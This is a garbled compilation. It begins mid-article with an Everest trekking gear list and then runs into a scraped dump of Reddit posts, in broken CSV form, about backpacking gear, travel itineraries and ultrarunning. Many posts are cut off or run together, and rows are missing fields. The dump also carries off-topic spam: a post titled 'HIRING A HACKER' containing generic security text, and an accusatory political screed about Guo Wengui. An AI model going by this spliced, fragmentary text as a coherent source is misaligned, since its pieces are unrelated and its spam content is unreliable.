Now, by wearing inner gloves, you build a base layer to keep your  hands warm as well as dry. When you wear gloves outside, you will layer  the inner glove and be able to protect the hand from the bitterest cold  temperature. Both of them protect you from rain, snow, and cold. Also be  sure to check out the following gears before heading to the base camp.

### Hiking Boot

Your leg is as important as the upper part. Wearing a hiking boot,  you will support your ankle, keep your feet dry on the tricky terrain,  as well as while walking off trail. You should go for a hiking boot that  is stable, breathable, and light. The boot must give space for your toe  to spread. This is what makes your feet healthy.

### Sunglasses

Do you need sunglasses for hiking as well as for seeing snow? When  you buy the glasses, look for the one that reflects light and UV rays. A  great piece you should carry when you are engaged in outdoor  activities. At the same time, it must be fitting and comfortable.

### Camp Shoe

After 7 hours, it is time to take off your hiking boot, and be  prepared to wear a camp shoe. As you are in a camp shoe in a lodge, your  feet will feel ultra light, and the shoe is opened air. It is well  ventilated. You feel you are in heaven at the end of the day. When you  are in a camp shoe, it must give you maximum comfort. Buy such a one.

### Broad Brimmed Hat

As  you trek, you will see a clear sky. The sun is shining brightly,  and it is time to protect your face and neck from the sun’s rays. A  broad-brimmed hat constitutes the protection. Not only that, it is  comfortable. You will stay safe, and you can easily pack it in your bag.  You have got yourself covered with the following trekking gears.

## Important Trekking Gear in the Everest region

Since you are trekking from a low altitude to a high altitude to the  base of the world’s highest mountain, you will be in a remote world  where you are cut off from the basics of the modern world. Most of the  items we have mentioned below look all important to you, but you have to  take into consideration the weight of the luggage from Kathmandu to  Lukla flight. The weight limit is 15 kg, and within this limit, you have  to include all the following essentials.

### Duffle Bag

The duffle bag we provide you, it makes the packing easier and is  water resistant. It is also light weight, and it comes with a strap.  This makes it easy to carry for a porter. At the airport, you can carry  it on your back easily. If it is not fully packed, you can make your  duffle bag as a hand bag. It can be compressed and is foldable.

### Walking Stick

Walking is full of fun in a remote place, but in some places, you  need support. A walking stick creates confidence and supports your body  weight. It also creates steadiness. You can lean on this  stick on a  steep hill. Descending becomes easier with this stick. Overall, a  walking stick prevents you from falling and slipping. A great asset.

### Trekking Backpack

Heading to the mountain without carrying a backpack is missing the  right gear. A trekking backpack must be comfortable and should come with  a hip belt. Side pockets will be a plus point. A trekking backpack must  have functionality. You should go for a padded shoulder strap backpack  as well as you should go for an ultra light and affordable one.

### Water Bottles

In addition to this, yes, you need an insulated water bottle in the  extreme temperature in the Everest region. It is more than an ideal  bottle. Sip water from a narrow slip lid, keep yourself away from  dehydration, and head to the destination. You can also keep tea and  coffee or simply cold water in it.

### Sleeping Bag

At night, the most important trekking gear is a sleeping bag. While  buying it, please check its temperature rating. Your sleeping bag must  be compressible, ultra light, comfortable, and warm. When you wake up,  you must be refreshed. Always use a compression sack to pack a sleeping  bag.

### Headlamp with extra batteries

When the night falls, you also need a head lamp. As you head to  Kalapatthar to see the world’s stunning view of Everest before dawn, the  importance of a headlight cannot be ignored. The headlamp keeps you on a  trekking trail. It must be water proof, and its battery life must run  from 25 hours to 180 hours. You can charge the battery by paying the  lowest rate in a lodge.

### Bag for dirty clothes

You know trekking is tiring as well as sweating. That’s why, we have  recommended you to wear moisture-wicking long-sleeve t-shirts. You have  to change your clothes and keep them in a bag. If you don’t change it,  there will be irritation. Carrying a bag helps you to stay clean and  tidy.

### Camera with extra batteries

You already know that the Everest region is loaded with snow –  covered mountains. All the trekkers want to capture this scene in their  cameras. They will be trekking for more than 3 hours every day, so you  can imagine the number of mountains you will see. As you take the  photos, you must know that your camera must be water resistant, and the  battery power must run longer. Always focus on the latter. Side by side,  please also look the following gears once again. Also check the GB of  your camera’s memory card.

"People who have done Olavsleden, what did you do for food?","So I'm trying to put together a complete Olavsleden hike, all 581km of it, and the biggest obstacle right now is food and how to carry it all. By my calculations using my go to freeze dried meals, I'd be looking at 13.5kg of food weight alone for the 25 days I'd be on the trail. 200g dinner, 200g lunch, 125g breakfast. 

  
I'm wondering how other people approached it. Did you buy stuff at grocery stores along the way instead? If so, waht? Did you ship packages along the way with food? I looked and there are a few sports stores along the way so maybe I could order ahead a bunch of freeze dried meals so I'm only carrying like 10 days of food at a time instead.

Roark mule 55l travel pack for multi day hiking trips???,Historically I’ve been a city backpacker never straying from civilisation for longer than a short day hike. However recently I’ve been interested in getting started on longer multi day wilderness hiking and after a long break from travel over Covid lockdowns I’ve decided nows the time to commit to that. I’ve been researching and accumulating gear for the past couple of months a tent and a pack being the last two major items I need to decide on. I don’t have a lot of money but after retiring my old travel pack due to wear my mum brought me the Roark Mule 55l for my last birthday. Based on my experience with travelling it seems like it’ll make a great travel pack but the company seems to be advertising it as usable for both city and outdoor travel adventures but I don’t know enough about hiking packs to know if this is true as it seem pretty different from a lot of the packs that more experienced hikers recommend. I’m happy to make a few small sacrifices to save some money but was wondering if anyone could shed some light on the cons of using this type of pack for hiking trips if there are any. I’m planning to start with a few shorter trips across Australia and New Zealand as this is home base but hopefully will be able to head overseas and experience the beauty of the outdoors across the world (i know that one pack is probably not going to last that long but… just for context),backpacking,1646549801

Do you go on extended wilderness ventures alone or with others?,"I love the outdoors and I am comfortable going on long trail running adventures but never on really remote trail systems. I am fine and comfortable doing this alone but I get nervous when I try to hike/camp more remote areas or go exploring alone. I usually don't get very far before turning around and cancelling because of how uneasy I feel.

My obstacle is that no one I know is open to going on multiple day hikes/camping trips with me since most of my friends don't really enjoy that stuff. I'm really tired of being held back by fear but I am also really weary of going out there alone.

For context, I am a 5' 2 and 112 lbs woman in my 20s. I have already had a couple of alarming run-ins with sketchy characters while out trail running. It's unnerving. My relatives and friends also worry about me and I feel it's justified given my personal experiences but at the same time, I don't want to give up my interests because of that.

If you're like me, how did you prepare to go on these adventures alone? Or what advice would you give me? How did you overcome your fear? Or how did you go about making friends who had similar interests?",backpacking,1646535653

Need recommendations for some tropical climate hiking boots for an upcoming backpacking trip!,"Hi! Im going to be backpacking in Belize (spending a lot of time in the rainforests, walking in very remote places over 5km a day) this summer and I need some recommendations for some lightweight breathable hiking boots.

I currently have some boots but they are very heavy winter waterproof type boots and I don't think they would be suitable because they can be quite restrictive, especially if im walking in rainforests with uneven paths. I still want to be able to be nimble and feel the ground. im looking for boots which are almost like running shoes, but with the extra ankle support. plus if they are extremely compact/lightweight and I can just stuff them into my backpack for the airport/plane ride or when im in civilisation. 

Ive found a couple pairs which might work but im not sure as they still look quite heavy. I would just wear running shoes but I would constantly be afraid of A) twisting my ankle and B) not having a good grip on the ground ( and C) also looking out of place when everyone else has nice boots lol) .

HIRING A HACKER," 

### How can hackers find me?

Anyone who uses a computer connected to the Internet is susceptible to  the threats that computer hackers and online predators pose. These  online villains typically use [phishing scams](https://www.webroot.com/us/en/resources/tips-articles/computer-security-threats-phishing), spam email or instant messages and bogus websites to deliver [dangerous malware](https://www.webroot.com/us/en/resources/tips-articles/malware) to your computer and compromise your computer security.

Computer hackers can also try to access your computer and private  information directly if you are not protected by a firewall. They  can monitor your conversations or peruse the back-end of your personal  website. Usually disguised with a bogus identity, predators can lure you  into revealing sensitive personal and financial information, or much  worse.",backpacking,1646256323

Hi everyone! Not sure if this is allowed in here or not, but I wanted to share with the group my new-ish small business, Broken Compass Outfitters (www.brokencompassoutfitters.com). We opened up last summer, and are based in North Carolina. Our main goal with this outdoor clothing brand is to protect the areas we all like to explore. We aren't in this just to provide high quality outdoor clothing. We love being outdoors; it's our passion. We believe in protecting nature and ensuring it stays clean. We are always cleaning up when we are out exploring. But we realize there is more we can do through this brand. So we donate 10% of every purchase to organizations whose efforts support our beliefs and help clean up our waterways and trailways. Our efforts help to keep nature open for exploration and enjoyment. And we want to do more as we grow. But we can’t without support from our fellow explorers.

Female solo land travel - Advice for Central America,"Hi,

I'm (22f) currently planning a solo backpacking trip through Latin and Central America. The duration is set for approx. 4 months (April to August '22). My dream would be to start in Chile in April and then slowly work my way up to Mexico for the next couple of months, arriving in Mexico in early July.

The countries I would definitely want to travel to are: Chile, Bolivia, Peru, Colombia, Panama, Costa Rica, Nicaragua, Honduras, Guatemala and Mexico. I might also want to visit Ecuador and El Salvador, while I'm already there.

I have previously lived in Mexico for a year, so I'm fluent in Spanish and also familiar with different regions there. I also have some friends I want to visit. I have collected some information on travelling and it seems to me that Chile, Bolivia, Peru, Panama and Costa Rica are relatively safe countries for travel (correct me if I'm wrong). 

My main concern is regarding the safety in Colombia, Nicaragua, Honduras and Guatemala. I would really love travelling on land for the whole journey from Chile to Mexico (if all borders are open), but am also unfamiliar with the situation in the aforementioned countries. Any advice and experience with travel in the region would really be appreciated!",backpacking,1646168700

Looking for recommendations on what backpack to get,My budget is up to $350 but I'd prefer a little lower. I'm looking for something that can hold a big load of gear since I usually do multi day trips and always pack a lot of gear. I'd like one with a detachable day pack and lots of pockets and straps on the outside to hook on extra gear. I don't really care about weight at all and would prefer a more sturdy well built pack that can take some abuse. Thanks for any recommendations you guys can give!,backpacking,1646106588

Anyone go backpacking while pregnant?,"I’m an experienced backpacker in my 30s who is pregnant. I’m currently about 10 weeks. I’ve been hoping to go on a few backpacking trips this spring/early summer during the 2nd trimester to take advantage of these trips while I’m still child free. But I can’t seem to find many others that have done it. At least one trip on my mind will be solo but it will also be relatively flat and only 2 nights and &lt;7 miles a day. My dog will come with though. She’s great company and will be 12 this summer so we take it fairly easy. 

Obviously, I plan to listen to my body. I’m good at knowing my limits and when to stay within them, this is one of those times I won’t be getting outside of my comfort zone. 

I’m current fatigued but I’m hoping that gets easier in the second trimester. And I’ll also be mindful of my loosening joints while carrying extra weight.

Mid 30s short trip to Thailand - Bangkok &amp; Koh Samui - tips please,"My husband and I plan to go to Thailand for a belated honeymoon in May. Neither of us have travelled/backpacked so I’m a little anxious about it.

Personally, I want to know what’s good in Bangkok? Where’s good to party that’s not seedy? Nice areas to stay that’s close to other things. It’s not somewhere I’d choose to go but my husband is keen (with very little idea of what’s there).

What would you do?,"We are landing in Athens early May, spending a couple of days there, then about 2 weeks on Syros, Mykonos, Naxos and Crete, then roughly 2 weeks exploring mainland greece and making our way up to Macedonia.

A week roughly in Macedonia, then to Serbia where we have family and will remian for around 3 weeks.

Montenegro roughly 1 week

Bosnia roughly 10 days, Croatia roughly 10 days,

1 week in Slovenia

1 week in Hungary

1 week in Slovakia

1 week in Czech

Our primary form of transportation would be bus, train.

We would stay mainly in hostels, airbnbs, and family as we have a considerable amount spread around this region.

Our budget (each) is planned to be around 4-6 thousand dollars (CAD)

Is this feasible? We have been planning quite a lot and feel that this could be realistic.

"Forcibly locked for three years, Guo Wengui tore off the skin of the painting to reveal the wolf's hideous face","Guo Wengui, who has been devastated by high debts and fines, recently explained to everyone what it means to ""lift a stone and shoot himself in the foot"" and ""expose if he can't hold it."" Guo Wengui, who felt that a catastrophe was imminent, made a last-ditch effort to survive, so he took out the half-baked product ""Xi Coin"", a Sanwu product that he had been shouting for for several months, to make money. However, because of its inherent deficiencies and too many loopholes, even though Guo Wengui incarnates as a diligent person and sells wildly in the live broadcast room day and night, the effect of making money is still not ideal.

Over the past few years, whether it is the Rule of Law Fund, GTV, Chicken Turnover or Happy Coins, Guo Wengui's promises to the ants ""attractive money scene"" have been linked one by one, and the ethereal and beautiful flat cakes have been stacked on top of each other. But which of these promises and pie has been fulfilled and realized? On the contrary, the real losses of the ants are worse than each other. And those who came forward to testify that Guo Wengui was a liar and the little ants were labeled by Guo Wengui as pseudo-types and traitors one after another. Therefore, it is said that the ants ""were born by Guo Wengui's people, and died by Guo Wengui's ghost."" There will never be a day to come forward, unless you quickly report the case to the FBI, SEC and other departments, you can get back the loss and get out of the sea of ​​misery.",backpacking,1645842865

Backpack Trip Planning,"I am a backpacking leader for a volunteer organization. Generally, we do 1-3 night trips within a few hours of the area I live for varying levels of backpacking skill (beginner to advanced). 

We’re getting ready to plan trips for the spring, summer, and fall. I love studying maps and identifying routes, but I also have a full time, 50-60 hour per week job that leaves me little time for planning. Is there some kind of program, platform, website, app, etc. that helps with planning routes for these kinds of trips? We end up doing a lot of the same routes over and over again since no one has a ton of time to dedicate to intricate planning. 

I also welcome ideas, feedback, etc. on how others plan out overnight backpacking trips for themselves or groups. 

TIA.",backpacking,1645819464

Any fresh backpacking route in Europe where I can walk for one month in August?,"Hello everybody, 

This summer my company will ask me to take all the holidays together in August.

Having a full month so I would like to organize a walk with my girlfriend, sleeping in tent or in hostels. 

Initially we thought about kungsleden (in sweden), in particular in order not to suffer from the heat of August. 

The night temperature around zero, however, made my girlfriend give up on doing it in a tent and always staying overnight in hostels seems prohibitive for the costs (it seems 50 euros per night, but maybe I'm wrong, I read it online). 

Do you have suggestions for walks with mild temperatures and affordable prices? 

Thanks in advance

3 month trip in Mexico,"I am planning on a 3 month trip to Mexico from April to June, visiting several cities. I love hiking, diving, and any other nature activities. I am also interesting in seeing some of the cities but am more interested in nature, like the beach or mountains. I will be flying from the US. Below is the path I am planning on taking. Would appreciate any feedback or suggestions.

1. Fly into Puerto Vallarta. (4 days)
2. Guadalajara (4 days)
3. Guanajuato (4 days)
4. San Miguel de Allende (3 days)
5. Mexico City  (8 days with 2-3 of those days in Tolantongo to see the hot springs)
6. Puebla (3 days)
7. Oaxaca (5 days)
8. Puerto Escondido (4 days)
9. San Cristobal de las Casas (5 days)
10. Palenque (5 days)
11. Campeche (5 days)
12. Merida (5 days)
13. Izamal (1 day, pass through day)
14. Valladolid (7 days)
15. Tulum (7 days, seeing some friends here)
16. Cozumel (3 days)
17. Isla Mujeres (3 days, not planning on going to Cancun since I've been there already but heard diving in Isla Mujeres is very good)
18. Holbox (7 days)
19. Fly out of Cancun

It seems like most nature/beach activities are in Chiapas or the Yucatan Peninsula so I've planned to spend more time in those areas to see any ruins, cenotes or go diving. Any recommendations on 'must see' items around any of the cities I have listed?

I saw ADO runs mostly in cities south of Mexico City. What is the best way for me to get from Puerto Vallarta&gt;Guadalajara&gt;Guanajuato&gt;San Miguel de Allende&gt;Mexico City? Also, for some reason I couldn't find any buses that go from Puerto Escondido or even Oaxaca to San Cristobal de las Casas, so not sure the best way to get to San Cristobal.

I've heard from some folks on here that they don't allow you to stay any longer than 30-45 days even though as a US citizen I should be able to stay for 180 days. Is this still true and is there anything I need to do in advance that will allow me to stay at least 90 days?

Thank you!",backpacking,1645759178

Travel Luggage and One Way Rental,"Hello fellow travelers! I'm hoping we could start a convo about the amount of luggage you guys like to have with you when travelling.

I'm following a few travelling nomad youtubers, like Harald Baldr and in almost all of his videos, I've seen him only travelling with a backpack. But then if you've seen his Shrilanka videos where he's driving with a scooter from Bandarawela to Kandy he's got just a backpack, but then on an airport travelling from Shrilanka to Qatar, he's got an additional suitcase. How does this work? I've also figured out there is this thing called ""one-way rental"", where you rent a car/scooter on one location and leave it on another (I guess this is how many of these travel vloggers do it?), but regarding the luggage, does he ship it to another location or something? On the other hand Dale Philip always travels with a backpack only, which is optimal for mobility, but it's hard for me to imagine travelling to other part of the world with only like 2 pairs of clothing.

Bear/critter bag opinions on the OHT in March,"This will be the longest backpacking trip that I have done to date (~8 days) and haven't really been in backpacking situations where food management in this sense has been an issue. I have read that the Ozark Highlands Trail has minimal bear activity so my current plan is to put all of my food in one sea to summit stuff sack (because I already own that), and hang it from a tree limb. My questions are:

Is the stuff sack fine? I'm getting caught up on not finding a source outright announcing to ""just find something that can be hung from a tree"". It will be a little hefty for the first few days but it seems the bag could handle it...

Should I use an odor-proof bag for the food, then put that bag inside the bag which I hang?

How far from camp do I hang my goodies?

Is an odor-proof bag for trash something I should consider? It looks like the only thing it will contain is my ziplocs from pre-portioned meals. Is it a mortal sin to just put them back in with my food?

What should I take with me on a backpacking trip across Portugal?,"Hello everybody!

&amp;#x200B;

As you can guess, I’m planning a trip to Portugal. Besides, I’m planning to go backpacking there with my friend. Actually, my friend is from Portugal. He came to the US on the Erasmus college program, and we quickly became friends. So, before he left for good, he invited me to visit Portugal.

&amp;#x200B;

Recently, he contacted me and asked if I wanna go backpacking during the Spring break. Of course, I said yes. I’ve never been to Portugal before, and I haven’t even been to any European country before. Besides, I cannot say that I’ve been on backpacking trips before, which involved visiting several cities. That’s why I’m not really sure what I should bring with me. I love walking long distances and can crosswalk the entire city, but I’ve never walked to another city.

&amp;#x200B;

So, I’ve started with some basic stuff, such as applying for a visa and browsing different places we will visit. Besides, I’ve started to look for some stuff that I will definitely need with me, such as comfy boots, a cap, a couple of T-shirts, and some basic clothes. Also, I found the most important thing that I will need — a backpack. I found one by Monos travel, but I dunno if they are suitable for trips like this or not. I know that they are high quality, but are they suitable for camping and backpacking?

&amp;#x200B;

Besides, what else should I bring with me? Because I also have to carry it on myself. We are starting our journey from Lisbon and planning to reach Nazare. It’s one small village famous for its gigantic waves. It attracts many professional surfers across the World. I have always dreamed of visiting this place, and I hope to still catch the giant waves season. Coz it finishes soon.

Has anyone here done multiple long distance treks in one go? I’m from Canada and my goal for this summer is to hit some incredible European hikes. I’m flexible with my timeline and in an ideal world I would love to do AV1, Walker’s Haute Route, TMB, and the GR20 all in the span of this hiking season hahaha…is that way to ambitious? If you think it’s possible, what do you think would be the most logical way to go about it? I’d also love to spend time in some of the countries along the way…maybe like 2 weeks hiking, 1 week off type of thing.

I cleaned both (I thought), oiled both, WD-40 on both, but still I can’t open one of them at all. Next step would be to use a pair of pliers and a vise which would probably destroy the metal.

Getting back into backpacking,"I've recently decided I want to get back into backpacking.  I used to go on frequent trips, when I was in scouting.  I think my longest was an 8 night 75 mile trip over spring break one year on the AT.

That was about 25 years ago.

My equipment from that time is long gone.  I think I got a pretty good kit assembled, and am planning a shakedown trip at a park in my local area (1 overnight, 5 miles out, 5 miles back, relatively level terrain).

At this point, I'm trying to decide what my second trip should be.  Ideally, here's what I'm looking for.

Arrive Friday evening to make camp.

Hike Saturday.

Camp Saturday night.

Hike Sunday, return to car / home.

I would like this trip to be somewhere in Virginia, MD, or maybe the eastern edge of WV.  I would like a trip which is rewarding with views and whatnot.  I'm not opposed to trying something on the AT, but probably not the more difficult sections.

I would like to keep my total mileage for the trip below 12.

I'm looking at various options on various websites, but I'm kind of overwhelmed with abundance of information.

Any suggestions?",backpacking,1645564090

Young Backpackers and Travelers? How?,"Hi! I'm sorry for asking this again as I know its probably been asked many of times, and I have looked at a few other posts on this topic.

I know everybody's situation and circumstances are different, but every time I see people around my age or younger traveling to places like, Greece, the rainforest, Venice, etc. etc. etc. it makes me severely deflated and depressed knowing that I've never been out of my country of Canada.

I just can't fathom how it's done with having to pay rent, utilities, car insurance, food, and all of the other basic ""necessities"" each month, all while working a full-time job, and potentially for some, studying for an education as well.

For reference I've just turned 23yrs old and make $17.75/hr in Alberta (not much, but at least it's $2.75 above our minimum wage.) My parents have been divorced since I was a child, and at 16yrs old, they both stopped communicating with me, so money coming from them in the past or future isn't/wasn't a possibility at any point.

If anyone can provide any basic and/or even advanced tips and ideas on this subject, I'd be forever grateful!

I really just want to increase my knowledge on this and start forming a better plan so that I can eventually get out there and see some more of the world, along with new experiences.

Their website says snowmass is a little roomier, but I’m worried if the lower quality down in that sleeping bag would make a big difference. It looks like they do use more down in that bag, but it is not that much more. Also it looks like they have different baffles, horizontal versus vertical, and I’m not sure if that makes a difference or not. Eolus s is also more expensive.

"Help with choosing a sturdy, multipurpose backpack","Hey everyone, I am trying to decide between 2 backpacks. Here are the links to them both and then I'll get into the debate I'm currently having with myself:

The first one was recommended to me in a size medium by a REI employee after he measured me as a ""very solid medium."" Lots of cool features I like.

 [Amazon.com: Gregory Mountain Products Men's Baltoro 75 : Everything Else](https://www.amazon.com/Gregory-Mountain-Products-Baltoro-Backpack/dp/B073P34LF8/ref=sr_1_1?adgrpid=1333708169271427&amp;hvadid=83356831527470&amp;hvbmt=bp&amp;hvdev=c&amp;hvlocphy=71527&amp;hvnetw=o&amp;hvqmt=p&amp;hvtargid=kwd-83357106086064%3Aloc-190&amp;hydadcr=2894_10630018&amp;keywords=gregory+baltoro+75+pack+-+men%27s&amp;qid=1645454080&amp;sr=8-1) 

The second one I found online after finding out that the Gregory lifetime warranty isn't all that, especially compared to Osprey's.

 [Amazon.com: Osprey Packs Men's Petrol Blue, O/S : Clothing, Shoes &amp; Jewelry](https://www.amazon.com/Osprey-Packs-Farpoint-Travel-Backpack/dp/B07P5Z1D9K/ref=cs_sr_dp_2?crid=T9ZCREKKGRWQ&amp;keywords=osprey%2Bfarpoint%2B75&amp;qid=1645454504&amp;sprefix=osprey%2Bfarpoint%2B75%2Caps%2C82&amp;sr=8-1&amp;th=1&amp;psc=1) 

What I am looking for is a multipurpose backpack that will last me a very long time for both wilderness camping and an upcoming backpacking trip to Europe (as well as future travels); **I prefer to have one backpack that works fairly adequately for both of these things rather than two backpacks that fit each of these purposes perfectly.**

**Gregory Pros:**

Comes with day bag and weather cover

It is sized, while the Osprey is one size and adjustable. I imagine that sized is better?

Seems to have better back support

The way it opens gives me a lot of good access

**Cons:**

The lifetime warranty really only covers factory defects (but I've also heard of people just getting new bags for sending their old one for wear and tear)

&amp;#x200B;

**Osprey Pros:**

The brand's true lifetime warranty which covers just about anything and everything

""Stowable aircover"" which I like because all the pockets on backpacks make me nervous about things falling off when checked in for a flight

The way it opens gives me a lot of good access

**Con:**

Perhaps the fact that it's adjustable might be a hassle?

&amp;#x200B;

Both are the size I want them to be (75 liters), around the same price (&lt; $260), and open wide, and though the Gregory seems like it will fit and support better, the Osprey has that true lifetime warranty that will make it so that I don't have to buy another backpack.

Backpacking with kids and bag size,"I'm looking at getting gear to take my little guy, he's 3 now and will likely be 4 by the time I get everything together, out on a 1-2 night backpacking trip. I'm stuck between the Osprey Atmos 65 and Osprey Aether 85. I'm leaning towards the larger pack because I will be carrying extra gear for my little guy. I also plan on bringing my wife and daughter when my daughter is a bit older which will mean even more gear then. I'm stuck because the Atmos was much more comfortable and about $120 cheaper than the Aether. Will 65 liters be enough for the larger trip given it will only be for 1-2 nights max and likely only a few miles out? Or should I invest in the larger pack to have the extra space? 
I did read that the Atmos can hold enough for a 10 day trip if need be but is better suited for 3-5. All I've learned is online so please let me know if I have anything wrong.

1. Is  this itinerary reasonable, considering I have to work pretty much 4-5  months full time? I am backpacking and have a relatively quick traveling  pace (not seeking too much comfort and luxury)
2. Flight from Buenos Aires to Salta? Or worth to take a bus and stop in Rosario and Córdoba for example?
3. Is Paraguay (Asuncion then bus to Iguazu) worth a visit apart from Iguazu Falls?
4. Is  Iguazu from the Brazilian side 'sufficient' or is it very much worth it  to take a bus to the Argentinian side as well? Considering covid hassle  etc. as well?
5. From Iguazu in Brazil, is Rio and Sao Paolo worth about a (small) week? Or should I add in Florianopolis as well for example?

Thanks in advance for any tips :) And feel free to ask anything.",backpacking,1645446524

Anyone successfully gotten back to ultra distances after breaking an ankle?,"I guess I’m just looking for anyones personal experience recovering from a broken ankle and getting their precious mileage back, or anywhere close.

A historic six-day ultrarunning race, the “First Astley Belt Race”, was held in 1878, in London England 🇬🇧, to determine the Long-Distance Champion of the World. Running was permitted for the first time in addition to walking, “Go-As-You-Please.” An expensive belt made of silver and gold was awarded to the winner. The race was highly competitive, involved trash-talking, witnessed by tens of thousands, and involved wagers totally in more than $15 million in today’s value. Fascinating details were published. Did running work better than walking?

in the morning to work i run 7.5k and on the way home i do a 10k, i do this currently 2x a week for about 30k, buildign towards 4 (mayeb 5) days a week over the next 2 months ahead of a 50k trail on the 17th of july. In the weekends when i can run i do pace work, 5ks at pace, or mountainbiking or climbing. 

Ive read a few places people talking about getting their weekly runs up to 70% of race day distance, but because i live in a VERY flat area and struggle to get exposure to hills in my commute i am choosing to get my weekly run to 120% especialyl given im actually splitting my daily runs across two runs.

Newbie Alert,"Hello all 👋
Newbie here. 
TLDR; what should my max long run look like and when should I stop adding 10%/1m to my long run.
26m 5’8” 155-160lbs
I recently lost 125lbs in the search for health, physique, and bodybuilding. Nowhere in my initial weight loss journey did I ever think I’d be interested in running let alone ultra running.

My initial journey was for health/appearance and I decided to test my metal and see what my fitness level had become so I joined a Spartan sprint. Joining the sprint made me buckle down on my cardio so I ran a 5k every other day in February and did a full workout afterwards.

I did the race with a buddy and ended up having to slow down my pace to maintain with him. Even with me chilling we did fairy well, top 16%! Immediately after the race I signed up for 2 more, the 10k and 20k. Somewhere along my research into this realm I found out about the 50k Spartan and that seed is slowly sprouting… I find myself watching Courtney, Goggins, Jakko, Rich Roll. And now I have it in my mind that I want to run a 100m….

In my month of 5ks I ran a few 10ks and I’ve felt perfectly fine after and have had little to no fatigue the next day. Right now I’m working on getting my long run up weekly using the +10% or +1mile weekly protocol. I decided to start with the 5k as my base and now I’m at 10k on my long runs. I’m still perfectly fine post long run and the next day. 
Should I have started with a longer base mileage? Should I increase my mileage on my long run more than 10% weekly?
My next race is a 10k at the end of next month, then the 20k in October, I’m thinking of a marathon in February and an ultra next December. At my current pace I should be at a marathon mileage before my 20k. Should I keep the race progression 5k,10k,20k, marathon, 50k, 50m, 100m ? What should my max long run look like before I stop adding 10%/1m

I want to go stick with the handhelds for this race. 

There is an 8 mile section in between aid with  around 2k vert, assuming this will be a slower section, I was thinking about leaving the prior aid station drinking 20z of fluids and my two 22oz handhelds full.

Advice on vests/packs for races and commutes? Tried to include plenty of info,"Hey folks, looking for a Running Vest/Backpack to use for some upcoming races and also use it for some commuting. Got some ideas, but looking for some input. 

Current race line up is a 100k and potentially some mountain stuff. Plan to go for 100 milers in the future I hope. For racing I like a bottle or two on the front. 

Work commute is around 4 miles each way, need to carry a tablet in a case, some papers, lunch, trousers, underwear and socks. Then likely a coat or another layer in everything but summer. This is the UK so good chance of rain, so some water resistantance/proofing is ideal. Also some way to separate the laptop would be great. 

 I'm 5 11' and about 80kg. I currently have the Salomon Advanced Skin 12 which is amazing but no good for the commute and is quite tattered at this point.

Some I've looked at are Black Diamond Distance 15, OMM Phantom 20, Raidlight Olmo Ultra and Ultimate Direction Fastpack 20 or 25. Equally open to any suggestions.

"Location-based watch reminders for a mountain 100 miler (by lat/long, NOT address)","Hi folks, I'm looking for a way to set reminders for myself along the route of a 100 miler. It's in the mountains/backcountry. Cell service will be poor in areas.

The iPhone Reminders app handles time-based reminders well enough (things like, ""gel and water"" repeated at the top of each hour or ""take caffeine gel"" at 2am) and my Suunto displays the text. The phone can be in Airplane Mode and can also play an additional alert sound to catch my attention. This works fine, assuming the phone is charged, etc.

However, I can also imagine that location-based reminders would be useful. Things to the effect of ""AS #5, don't leave without required gear"" or ""tricky left turn in .2 miles"" or whatever.

Geofencing reminders aren't new tech by any means, but the iOS Reminders App can't accept a lat/long, only street addresses that already exist in their database, like businesses. This obviously isn't going to work on a mountain singletrack course.

Has anyone tried to do this before and found an app that handles this? Or found a similar system that worked for you? My usual plan is to carry written notes (bright paper ""laminated"" with clear tape) for each segment, but that was with a much older watch.

Shoe recommendations for 100 on pavement,"Hey everybody! I've got a 100 coming up in about a month, and it's 100% on pavement! I'm trying to figure out what shoes to wear. I've run several 100s and a bunch of other ultras, but never more than a marathon on pavement, so I'm not sure what to go with.

For background, I run all my trail miles (including all my ultras) in Nike Terra Kigers, so I guess I'm not a fan of super plush shoes when it comes to long events. I have three different road shoes in my rotation right now: NB Vongo, NB 860, Nike Miler.

My favorites are the Vongos, but they have 450 miles on them, and it's a past year's model that has changed significantly. So The 860s are OK, I guess, but I don't **love** them. I bought the Nike Milers because they were cheap at the Nike Outlet, and I saw they were designed for long runs, but the extreme cushioning feels a bit weird, and I have a hard time picturing myself doing 100 miles in them. Other shoes I've liked in the past have been Nike Vomero and Nike Peg Turbo 2. I've tried Altra and Hoka, and both tear my feet up.

I've been thinking about checking out something with a plate, as I've heard that they can help keep your legs fresh on longer events, so I'm thinking of picking up a pair of Nike Zoom Fly (carbon plate) or Saucony Endorphin Speed (nylon plate) or Endorphin Pro (carbon plate).

All that to say: what shoes do you think I should check out for a paved 100, based on what I've mentioned so far? Any experience with shoes that have plates during a 100?

Stuck with Peroneal Tendonitis,"Hey y'all, 

About a month and a half ago I started with intermittent pain on the outside of my right ankle after walking to and from work in snow boots for about 3 miles in total a day. I got new shoes and saw an orthopedic PA who told me it should go away in about two weeks with stretching/strengthening. Additionally got an x-ray that showed nothing. Nothing traumatic happened to the ankle, but I stopped all running and strenuous exercise.

Two weeks later (With new shoes and orthotics), I was limping at the end of a workday (I work in a hospital). So I decided to put myself in a walking boot.  4 weeks later coming out of the walking boot, I have a new burning sensation on the outside of my peroneal tendon with short distance walking. Still no swelling or tenderness to touch. I got the doc to order me an MRI for this Thursday. All the PTs/MDs, I've seen so far have told me they would bet I dont have a tear.

So I feel like the MRI isn't going to show anything major, but I don't know what else to do at this point. I feel like no one will operate on me if there's not a tear. I'm hesitant to try EWST since the research is pretty mixed and it will be out of pocket but I'm so desperate at this point I would also try anything. 

I am not looking for medical recommendations, just anecdotal l information from other people about their stories and if I'm just not being patient enough?

Schedule Core Training for Ultra Runners,"Hi there,

I am an Ultrarunner and currently training for the next 100 km race in July. On the way will be another Ultra over 60 km mid May. 

One of the learnings from my last 100 km race last year was I have to improve on nutrition and core stability. I think I got nutrition sorted now but I am struggling with efficient training for core stability. According to science I should practice this at least 2 or 3 times per week but I continuously forget and and if I do it I usually just to some planks and that's it. 

Now I am wondering on how I can improve. What helped well in the past was a Freeletics training plan which again and again reminded me of doing these exercises and when I did them they where nicely varied. But I canceled the Freeletics plan two times between week 7 and 9 because it was too hard to do it while getting in the miles for Ultra Training.

Questions from a Larger Runner,"I am a larger runner (190-200lbs) with pretty low BF %, but lot of ""extra"" muscle from my background in football/weightlifting. I have two questions:

